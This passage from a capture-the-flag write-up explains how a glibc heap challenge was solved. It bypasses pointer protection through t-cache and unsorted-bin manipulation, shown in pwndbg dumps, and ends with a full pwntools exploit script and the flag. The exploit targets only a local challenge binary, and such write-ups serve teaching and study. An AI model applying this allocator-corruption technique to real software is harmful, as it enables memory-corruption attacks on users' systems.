0x55ea572660b0	0x0000000000000000	0x0000000000000000	................
0x55ea572660c0	0x0000000000000000	0x0000000000000000	................
0x55ea572660d0	0x0000000000000000	0x0000000000000000	................
0x55ea572660e0	0x0000000000000000	0x0000000000000000	................
0x55ea572660f0	0x0000000000000000	0x0000000000000000	................
0x55ea57266100	0x0000000000000000	0x0000000000000000	................
0x55ea57266110	0x0000000000000000	0x0000000000000000	................
0x55ea57266120	0x0000000000000000	0x0000000000000000	................
0x55ea57266130	0x0000000000000000	0x0000000000000000	................
0x55ea57266140	0x0000000000000000	0x0000000000000000	................
0x55ea57266150	0x0000000000000000	0x0000000000000000	................
0x55ea57266160	0x0000000000000000	0x0000000000000000	................
0x55ea57266170	0x0000000000000000	0x0000000000000000	................
0x55ea57266180	0x0000000000000000	0x0000000000000000	................
0x55ea57266190	0x0000000000000000	0x0000000000000000	................
0x55ea572661a0	0x0000000000000000	0x0000000000000000	................
0x55ea572661b0	0x0000000000000000	0x0000000000000000	................
0x55ea572661c0	0x0000000000000000	0x0000000000000000	................
0x55ea572661d0	0x0000000000000000	0x0000000000000000	................
0x55ea572661e0	0x0000000000000000	0x0000000000000000	................
0x55ea572661f0	0x0000000000000000	0x0000000000000000	................
0x55ea57266200	0x0000000000000000	0x0000000000000000	................
0x55ea57266210	0x0000000000000000	0x0000000000000000	................
0x55ea57266220	0x0000000000000000	0x0000000000000000	................
0x55ea57266230	0x0000000000000000	0x0000000000000000	................
0x55ea57266240	0x0000000000000000	0x0000000000000000	................
0x55ea57266250	0x0000000000000000	0x0000000000000000	................
0x55ea57266260	0x0000000000000000	0x0000000000000000	................
0x55ea57266270	0x0000000000000000	0x0000000000000000	................
0x55ea57266280	0x0000000000000000	0x0000000000000000	................
0x55ea57266290	0x0000000000000000
pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x55ea572662d0 —▸ 0x7ffbebffed00 ◂— 0x55ea572662d0
smallbins
0x110: 0x55ea57267df0 —▸ 0x55ea57267b90 —▸ 0x7ffbebffee00 ◂— 0x55ea57267df0
largebins
empty

```

We can `free` the `mgmt` chunk and `re-allocate` it as much as we want.
This means that we now fully control the `per-thread cache`, giving us full `heap write` and the ability to control `LSB` of `t-cache` entries.


#### Bypassing protect_ptr without any leaks

This is funnily enough the easiest part of the entire challenge.

To do this, make two `t-cache` entries in two `t-cache bins` such as the following:
```python
###########################
#   Bypass protect_ptr    #
###########################

l1 = malloc(0x18, b'A'*0x18)
l2 = malloc(0x18, b'B'*0x18)

l3 = malloc(0x188, b'A'*0x188)
l4 = malloc(0x188, b'B'*0x188)

free(l1)
free(l2)
free(l3)
free(l4)
```

This will create the following heap setup:
```
pwndbg> vis 2

0x556630af6000	0x0000000000000000	0x0000000000000291	................
0x556630af6010	0x0000000556630af6	0x0000000000000000	..cV............
0x556630af6020	0x0000000000000000	0x0000000000000000	................
0x556630af6030	0x0000000000000000	0x0002000000000000	................
0x556630af6040	0x0000000000000000	0x0000000000000000	................
0x556630af6050	0x0000000000000000	0x0000000000000000	................
0x556630af6060	0x0000000000000000	0x0000000000000000	................
0x556630af6070	0x0000000000000000	0x0000000000000000	................
0x556630af6080	0x0000000000000000	0x0000000000000191	................
0x556630af6090	0x0000556630af6300	0x0000000000000000	.b.0fU..........
0x556630af60a0	0x0000000000000000	0x0000000000000000	................
0x556630af60b0	0x0000000000000000	0x0000000000000000	................
0x556630af60c0	0x0000000000000000	0x0000000000000000	................
0x556630af60d0	0x0000000000000000	0x0000000000000000	................
0x556630af60e0	0x0000000000000000	0x0000000000000000	................
0x556630af60f0	0x0000000000000000	0x0000000000000000	................
0x556630af6100	0x0000000000000000	0x0000000000000000	................
0x556630af6110	0x0000000000000000	0x0000000000000000	................
0x556630af6120	0x0000000000000000	0x0000000000000000	................
0x556630af6130	0x0000000000000000	0x0000000000000000	................
0x556630af6140	0x0000000000000000	0x0000556630af64b0	.........d.0fU..
0x556630af6150	0x0000000000000000	0x0000000000000000	................
[...]
pwndbg> bins
tcachebins
0x20 [  2]: 0x556630af6300 —▸ 0x556630af62e0 ◂— 0x0
0x190 [  2]: 0x556630af64b0 —▸ 0x556630af6320 ◂— 0x0

[...]

```

From here, change the `LSB` of the `0x20` `t-cache entry` to point to our desired pointer. In this case, that would be located at the `chunk` created by the `prep` function:
```
0x556630af6290	0x0000000000000000	0x0000000000000021	........!.......
0x556630af62a0	0x000001a95e006000	0x0000000000000000	.`.^............
0x556630af62b0	0x0000000000000000
```

To do so, let's free up the `mgmt` chunk again, then overwrite the `LSB` of our `0x20` entry to point to the `chunk` containing the `win` buffer:
```
pwndbg> vis 2

0x556630af6000	0x0000000000000000	0x0000000000000291	................
0x556630af6010	0x0000000556630af6	0x0000000000000000	..cV............
0x556630af6020	0x0000000000000000	0x0000000000000000	................
0x556630af6030	0x0000000000000000	0x0002000000000000	................
0x556630af6040	0x0000000000000000	0x0000000000000000	................
0x556630af6050	0x0000000000000000	0x0000000000000000	................
0x556630af6060	0x0000000000000000	0x0000000000000000	................
0x556630af6070	0x0000000000000000	0x0000000000000000	................
0x556630af6080	0x0000000000000000	0x0000000000000191	................
0x556630af6090	0x0000556630af62a0	0x0000000000000000	.b.0fU..........
0x556630af60a0	0x0000000000000000	0x0000000000000000	................
0x556630af60b0	0x0000000000000000	0x0000000000000000	................
0x556630af60c0	0x0000000000000000	0x0000000000000000	................
0x556630af60d0	0x0000000000000000	0x0000000000000000	................
0x556630af60e0	0x0000000000000000	0x0000000000000000	................
0x556630af60f0	0x0000000000000000	0x0000000000000000	................
0x556630af6100	0x0000000000000000	0x0000000000000000	................
0x556630af6110	0x0000000000000000	0x0000000000000000	................
0x556630af6120	0x0000000000000000	0x0000000000000000	................
0x556630af6130	0x0000000000000000	0x0000000000000000	................
0x556630af6140	0x0000000000000000	0x0000556630af64b0	.........d.0fU..
0x556630af6150	0x0000000000000000	0x0000000000000000	................
0x556630af6160	0x0000000000000000	0x0000000000000000	................
0x556630af6170	0x0000000000000000	0x0000000000000000	................
0x556630af6180	0x0000000000000000	0x0000000000000000	................
0x556630af6190	0x0000000000000000	0x0000000000000000	................
0x556630af61a0	0x0000000000000000	0x0000000000000000	................
0x556630af61b0	0x0000000000000000	0x0000000000000000	................
0x556630af61c0	0x0000000000000000	0x0000000000000000	................
0x556630af61d0	0x0000000000000000	0x0000000000000000	................
0x556630af61e0	0x0000000000000000	0x0000000000000000	................
0x556630af61f0	0x0000000000000000	0x0000000000000000	................
0x556630af6200	0x0000000000000000	0x0000000000000000	................
0x556630af6210	0x0000000000000000	0x0000000000000000	................
0x556630af6220	0x0000000000000000	0x0000000000000000	................
0x556630af6230	0x0000000000000000	0x0000000000000000	................
0x556630af6240	0x0000000000000000	0x0000000000000000	................
0x556630af6250	0x0000000000000000	0x0000000000000000	................
0x556630af6260	0x0000000000000000	0x0000000000000000	................
0x556630af6270	0x0000000000000000	0x0000000000000000	................
0x556630af6280	0x0000000000000000	0x0000000000000000	................
0x556630af6290	0x0000000000000000	0x0000000000000021	........!.......
0x556630af62a0	0x000001a95e006000	0x0000000000000000	.`.^............	 <-- tcachebins[0x20][0/2806]
0x556630af62b0	0x0000000000000000
pwndbg> bins
tcachebins
0x20 [2806]: 0x556630af62a0 ◂— 0x1ac08636af6
0x30 [22115]: 0x0
0x40 [  5]: 0x0
0x190 [  2]: 0x556630af64b0 —▸ 0x556630af6320 ◂— 0x0
0x3e0 [401]: 0x0
```

Allocating a `0x20 t-cache` entry will now cause the `win` pointer to be indexed in to the `per-thread cache` in a "protected" way:
```python
# Index the now encrypted pointer in to the heap management chunk
malloc(0x18, b'???')
```

Which then looks like the following:
```
pwndbg> vis 2

0x556630af6000	0x0000000000000000	0x0000000000000291	................
0x556630af6010	0x0000000556630af5	0x0000000000000000	..cV............
0x556630af6020	0x0000000000000000	0x0000000000000000	................
0x556630af6030	0x0000000000000000	0x0002000000000000	................
0x556630af6040	0x0000000000000000	0x0000000000000000	................
0x556630af6050	0x0000000000000000	0x0000000000000000	................
0x556630af6060	0x0000000000000000	0x0000000000000000	................
0x556630af6070	0x0000000000000000	0x0000000000000000	................
0x556630af6080	0x0000000000000000	0x0000000000000191	................
0x556630af6090	0x000001ac08636af6	0x0000000000000000	.jc.............
0x556630af60a0	0x0000000000000000	0x0000000000000000	................

[...]

0x556630af6120	0x0000000000000000	0x0000000000000000	................
0x556630af6130	0x0000000000000000	0x0000000000000000	................
0x556630af6140	0x0000000000000000	0x0000556630af64b0	.........d.0fU..
0x556630af6150	0x0000000000000000	0x0000000000000000	................

[...]

pwndbg> bins
tcachebins
0x20 [2805]: 0x1ac08636af6
0x30 [22115]: 0x0
0x40 [  5]: 0x0
0x190 [  2]: 0x556630af64b0 —▸ 0x556630af6320 ◂— 0x0
0x3e0 [401]: 0x0
fastbins

[...]
```

This is exactly what we want!

Now the way `protect_ptr` works is that it takes the address of what `free` is called on, shifts it by 12, then takes that and `xor's` it with the pointer stored in the chunk.
However since the protection mechanism is `xor`, it means that to "decrypt" it, we simply need to `xor` it again. And by first indexing it in to one `t-cache bin`, then referencing it from another `t-cache bin`, it will effectively be `xor`'d twice, leaving the original pointer.


Overwrite the `LSB` of the `0x190` chunk to point to the "protected" pointer in the `per-thread cache` for the `0x20` index:
```python
# Free the per-thread cache pointer again so we can use it to overwrite LSB of t-cache entries again
free(mgmt)

# Fake a chunk and make the LSB of 0x20 t-cache point to the WIN condition pointer
malloc(0x288, p16(0x6090), 0x138)
```

This makes it so the `0x190` `t-cache` points right above the `per-thread cache` of `0x20`, which now contains a "protected" pointer.

Now, if we inspect the heap, it will look like the following:

```
pwndbg> vis 2

0x556630af6000	0x0000000000000000	0x0000000000000291	................
0x556630af6010	0x0000000556630af6	0x0000000000000000	..cV............
0x556630af6020	0x0000000000000000	0x0000000000000000	................
0x556630af6030	0x0000000000000000	0x0002000000000000	................
0x556630af6040	0x0000000000000000	0x0000000000000000	................
0x556630af6050	0x0000000000000000	0x0000000000000000	................
0x556630af6060	0x0000000000000000	0x0000000000000000	................
0x556630af6070	0x0000000000000000	0x0000000000000000	................
0x556630af6080	0x0000000000000000	0x0000000000000191	................
0x556630af6090	0x000001ac08636af6	0x0000000000000000	.jc.............	 <-- tcachebins[0x190][0/2]
0x556630af60a0	0x0000000000000000	0x0000000000000000	................
0x556630af60b0	0x0000000000000000	0x0000000000000000	................
0x556630af60c0	0x0000000000000000	0x0000000000000000	................
0x556630af60d0	0x0000000000000000	0x0000000000000000	................
0x556630af60e0	0x0000000000000000	0x0000000000000000	................
0x556630af60f0	0x0000000000000000	0x0000000000000000	................
0x556630af6100	0x0000000000000000	0x0000000000000000	................
0x556630af6110	0x0000000000000000	0x0000000000000000	................
0x556630af6120	0x0000000000000000	0x0000000000000000	................
0x556630af6130	0x0000000000000000	0x0000000000000000	................
0x556630af6140	0x0000000000000000	0x0000556630af6090	.........`.0fU..

[...]

0x556630af6290	0x0000000000000000	0x0000000000000021	........!.......
0x556630af62a0	0x000001a95e3f3f3f	0x0000000000000000	???^............
0x556630af62b0	0x0000000000000000
pwndbg> bins
tcachebins
0x20 [2806]: 0x1ac08636af6
0x30 [22115]: 0x0
0x40 [  5]: 0x0
0x190 [  2]: 0x556630af6090 —▸ 0x1a95e006000 ◂— 0xf00dbeefd06bf331

```

And if you look at the `0x190` chunk, you will notice that the second `pointer` in the `array` contains the `win` address!!


#### Writing to win pointer

To write to the `win` pointer from here, simply allocate `0x188` twice.
Once to use up the current `t-cache entry`, and once to use the "upcoming" `t-cache entry`, which is the `win` ptr!

Here, we write the win condition, `0x37c3c7f` (37C3 CTF) to the address:
```python
########## Malloc twice to allocate the arbitrary pointer!
malloc(0x188, b'Next alloc is winz!')

# Set win-condition
malloc(0x188, p64(0x37C3C7F))
```

Then simply call the `dinner` option, and get the flag:
```python
###############
# $$$ WIN $$$ #
###############
p.sendline(b'3')
```

Running the exploit script will look like the following:
```
[0]malloc(0x88)
[1]malloc(0x88)
[2]malloc(0x88)
[3]malloc(0x88)
[4]malloc(0x88)
[5]malloc(0x88)
[6]malloc(0x88)
[7]malloc(0x1a8)
[8]malloc(0x1a8)
[9]malloc(0x1a8)
[10]malloc(0x1a8)
[11]malloc(0x1a8)
[12]malloc(0x1a8)
[13]malloc(0x1a8)
[14]malloc(0x3d8)
free(14)
[15]malloc(0x3e8)
free(15)
[16]malloc(0x18)
[17]malloc(0x88)
[18]malloc(0x88)
[19]malloc(0x88)
[20]malloc(0x88)
[21]malloc(0x18)
[22]malloc(0x88)
[23]malloc(0x88)
[24]malloc(0x88)
[25]malloc(0x88)
[26]malloc(0x18)
free(0)
free(1)
free(2)
free(3)
free(4)
free(5)
free(6)
free(17)
free(18)
free(19)
free(22)
free(23)
free(24)
[27]malloc(0x1a8)
[28]malloc(0x1a8)
free(19)
free(24)
free(27)
free(28)
[29]malloc(0x1a8)
[30]malloc(0x1a8)
free(7)
free(8)
free(9)
free(10)
free(11)
free(12)
free(13)
free(18)
free(23)
free(29)
free(20)
[31]malloc(0x38)
[32]malloc(0x48)
[33]malloc(0x38)
[34]malloc(0x58)
[35]malloc(0x108)
free(30)
free(25)
[36]malloc(0x38)
[37]malloc(0x48)
[38]malloc(0x38)
[39]malloc(0x58)
[40]malloc(0x108)
[41]malloc(0x108)
[42]malloc(0x108)
[43]malloc(0x108)
[44]malloc(0x108)
[45]malloc(0x108)
[46]malloc(0x108)
[47]malloc(0x108)
[48]malloc(0x108)
[49]malloc(0x108)
free(42)
free(43)
free(44)
free(45)
free(46)
free(47)
free(48)
free(49)
[50]malloc(0x5f8)
[51]malloc(0x5f8)
[52]malloc(0x5f8)
[53]malloc(0x5f8)
[54]malloc(0x5f8)
[55]malloc(0x5f8)
[56]malloc(0x5f8)
[57]malloc(0x5f8)
[58]malloc(0x5f8)
[59]malloc(0x5f8)
[60]malloc(0x5f8)
[61]malloc(0x5f8)
[62]malloc(0x5f8)
[63]malloc(0x5f8)
[64]malloc(0x5f8)
[65]malloc(0x5f8)
[66]malloc(0x5f8)
[67]malloc(0x5f8)
[68]malloc(0x5f8)
[69]malloc(0x5f8)
[70]malloc(0x5f8)
[71]malloc(0x5f8)
[72]malloc(0x5f8)
[73]malloc(0x5f8)
[74]malloc(0x5f8)
[75]malloc(0x5f8)
[76]malloc(0x5f8)
[77]malloc(0x5f8)
[78]malloc(0x5f8)
[79]malloc(0x5f8)
[80]malloc(0x5f8)
[81]malloc(0x5f8)
[82]malloc(0x5f8)
[83]malloc(0x5f8)
[84]malloc(0x5f8)
[85]malloc(0x5f8)
[86]malloc(0x5f8)
free(35)
free(41)
free(40)
[87]malloc(0xd8)
[88]malloc(0xe8)
[89]malloc(0x248)
[90]malloc(0x3d8)
[91]malloc(0x18)
[92]malloc(0x18)
[93]malloc(0x188)
[94]malloc(0x188)
free(91)
free(92)
free(93)
free(94)
free(90)
[95]malloc(0x288)
[96]malloc(0x18)
free(90)
[97]malloc(0x288)
[98]malloc(0x188)
[99]malloc(0x188)
[*] Switching to interactive mode
Checking for win condition...
potluck{ptr_pr0t_i5_c00l_n_411_bu7_d03s_1t_wrk?}
[*] Got EOF while reading in interactive
```

Flag:
`potluck{ptr_pr0t_i5_c00l_n_411_bu7_d03s_1t_wrk?}`
### Full exploit

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./chal')

alloc_count = -1

def menu():
    return p.recvuntil(b'> ')

def malloc(size, data, offset=0):
    global alloc_count
    print("[%s]malloc(%s)" % (alloc_count+1, hex(size)))
    p.sendline(b'1')
    p.sendlineafter(b'Allocation size: ', str(size).encode())
    p.sendlineafter(b'Write offset: ', str(offset).encode())
    p.sendafter(b'Data for buffer: ', data)
    alloc_count += 1
    menu()
    return alloc_count

def free(idx):
    print("free(%s)" % idx)
    p.sendline(b'2')
    p.sendlineafter(b'Free idx: ', str(idx).encode())
    menu()

p = process(elf.path)
menu()


#####################################
#           Prep allocations        #
#####################################

# This is the chunk size we will be working with for the unsorted bin hijack
mal_size = 0x88

# Make allocations for exhausting t-cache for later
tcache_0x90 = []
tcache_0x1b0 = []
for i in range(7):
    tcache_0x90.append(malloc(mal_size, b'TCACHE_FUEL'))
for i in range(7):
    tcache_0x1b0.append(malloc(0x1a8, b'TCACHE_FUEL'))

# Set 0x10001 in heap above 0x20 and 0x30 t-cache list
free(malloc(0x3d8, b'LSB OF FAKE CHUNK SIZE'))
free(malloc(0x3e8, b'MSB OF FAKE CHUNK SIZE'))

# Prep the allocation for two large unosrted bin entries with the ability
# to create a UAF
malloc(0x18, b'GUARD 1')
a1 = malloc(mal_size, b'A1'*(mal_size//2))
b1 = malloc(mal_size, b'B1'*(mal_size//2))
c1 = malloc(mal_size, b'C1'*(mal_size//2))
d1 = malloc(mal_size, b'D1'*(mal_size//2))
malloc(0x18, b'GUARD 2')
a2 = malloc(mal_size, b'A2'*(mal_size//2))
b2 = malloc(mal_size, b'B2'*(mal_size//2))
c2 = malloc(mal_size, b'C2'*(mal_size//2))
d2 = malloc(mal_size, b'D2'*(mal_size//2))
malloc(0x18, b'GUARD 3')

# Fill up the 0x90 t-cache
for i in tcache_0x90:
    free(i)

#########################################################
#           Create the UAF setup for later              #
#########################################################
free(a1)
free(b1)
free(c1)

free(a2)
free(b2)
free(c2)

unsorted2 = malloc(0x1a8, b'2'*0x118+p64(0x31))
unsorted1 = malloc(0x1a8, b'1'*0x118+p64(0x21))

free(c1) # 0x21 t-cache entry
free(c2) # 0x31 t-cache entry
free(unsorted2)
free(unsorted1)

unsorted1 = malloc(0x1a8, b'1'*mal_size+p64(0xe1))
unsorted2 = malloc(0x1a8, b'2'*mal_size+p64(0xf1))

# exhaust t-cache for later use
for i in tcache_0x1b0:
    free(i)

free(b1) # 0xe1 chunk entry
free(b2) # 0xf1 chunk entry
#########################################################
#       Fit the unsorted chunks to fit in the UAF       #
#########################################################

# Fit unsorted 1
free(unsorted1)
free(d1)

malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

unsorted_f1 = malloc(0x108, b'Y'*mal_size)

# Fit unsorted 2
free(unsorted2)
free(d2)

malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

unsorted_f2 = malloc(0x108, b'Z'*mal_size)

unsorted_f3 = malloc(0x108, b'X'*mal_size) # This will be hijacked

#################################################################
#               Create the two unsorted entries                 #
#################################################################
tcache_0x110 = []
for i in range(8):
    tcache_0x110.append(malloc(0x108, b'^'*0x108))
for i in tcache_0x110:
    free(i)

#################################################################################
#   Make the entry in the mgmt chunk a valid chunk by making the size 0x10000   #
#   and making a valid size next to it with prev_in_use set to 0                #
#################################################################################

for i in range(36):
    malloc(0x5f8, b'Z'*0x5f8)
malloc(0x5f8, b'A'*0xd0+p64(0x10000)+p64(0x20))

###############
# Free chunks #
###############

free(unsorted_f1) # Start of unsorted bin

free(unsorted_f3) # This will be hijacked for later

free(unsorted_f2) # End of unsorted bin


#############################################################################################
# Change the FWD and BCK pointers of the unsorted bin entires to our faked chunk in mgmt    #
#############################################################################################

malloc(0xd8, p16(0x6080), 0xa8) # BCK
malloc(0xe8, p16(0x6080), 0xa0) # FWD 

#########################################################################################
# Alloc in to mgmt chunk to overwrite LSB of 0x3d8 t-cache entry to control mgmt fully! #
#########################################################################################

# Overwrite lsb of 0x3d8
malloc(0x248, p16(0x6010), 0x1e0)

# Allocate at the management chunk!
mgmt = malloc(0x3d8, p8(0)*0x288)

###########################
#   Bypass protect_ptr    #
###########################

l1 = malloc(0x18, b'A'*0x18)
l2 = malloc(0x18, b'B'*0x18)

l3 = malloc(0x188, b'A'*0x188)
l4 = malloc(0x188, b'B'*0x188)

free(l1)
free(l2)
free(l3)
free(l4)

free(mgmt)

# Fake a chunk and make the LSB of 0x20 t-cache point to the WIN condition pointer
malloc(0x288, p64(0x191)+p16(0x62a0), 0x78)

# Index the now encrypted pointer in to the heap management chunk
malloc(0x18, b'???')

# Free the per-thread cache pointer again so we can use it to overwrite LSB of t-cache entries again
free(mgmt)

# Fake a chunk and make the LSB of 0x20 t-cache point to the WIN condition pointer
malloc(0x288, p16(0x6090), 0x138)

########## Malloc twice to allocate the arbitrary pointer!
malloc(0x188, b'Next alloc is winz!')

# Set win-condition
malloc(0x188, p64(0x37C3C7F))

###############
# $$$ WIN $$$ #
###############
p.sendline(b'3')

p.interactive()
```
